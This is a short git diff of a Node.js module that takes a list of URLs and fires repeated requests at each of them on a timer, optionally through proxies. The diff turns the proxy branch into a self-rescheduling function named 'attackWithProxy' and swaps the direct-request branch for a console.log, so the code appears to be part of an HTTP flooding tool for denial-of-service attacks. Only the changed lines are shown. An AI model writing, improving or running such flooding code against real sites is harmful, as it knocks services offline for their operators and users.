@@ -28,8 +28,8 @@ module.exports = async ({ urls, useProxy, timeout = 0 }) => {
             return params;
     }
 
-    if (useProxy) {
-        setInterval(() => {
+    function attackWithProxy(timeout) {
+        return setTimeout(() => {
             urls.forEach(url => {
                 try {
                     request(getParams(url), (err) => {});
@@ -47,16 +47,19 @@ module.exports = async ({ urls, useProxy, timeout = 0 }) => {
                     });
                 }
     
-                return;
+                return attackWithProxy(timeout);
             })
-    
-            return;
-        }, timeout);
+        }, +proxyList?.length + +timeout);
+    }
+
+    if (useProxy) {
+        return attackWithProxy(timeout);
     } else {
         setInterval(() => {
             urls.forEach(url => {
                 try {
-                    return request(getParams(url), () => {});
+                    // return request(getParams(url), () => {});
+                    console.log({url})
                 } catch(err) {
                     return;
                 }
